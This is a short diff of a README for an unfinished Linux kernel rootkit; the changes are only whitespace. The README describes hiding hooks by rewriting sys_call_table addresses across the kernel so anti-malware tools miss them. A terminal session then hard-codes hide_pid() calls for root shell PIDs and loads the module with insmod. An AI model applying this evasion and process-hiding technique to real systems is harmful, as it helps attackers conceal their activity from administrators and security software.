@@ -2,7 +2,7 @@
 
 This software is under development.  
 There's not even 1 release yet.  
-  
+
 # Hooking technique
 
 The idea is to replace the addresses of the sys_call_table in the whole kernel, avoiding anti malware to find hook handlers on the sys_call_table.  
@@ -35,8 +35,8 @@ diwou@diwou-VirtualBox:~/arprootkit$ ps auwx | grep bash | grep root
 root      3924  0.0  0.1  61932  4052 pts/9    S    13:10   0:00 sudo bash
 root      3925  0.0  0.1  29960  5444 pts/9    S+   13:10   0:00 bash
 diwou@diwou-VirtualBox:~/arprootkit$ grep 392 rootkit.c
-        hide_pid(3924);
-        hide_pid(3925);
+hide_pid(3924);
+hide_pid(3925);
 diwou@diwou-VirtualBox:~/arprootkit$ sudo insmod rootkit.ko
 find_vpid ffff9df24f34c180
 Ok
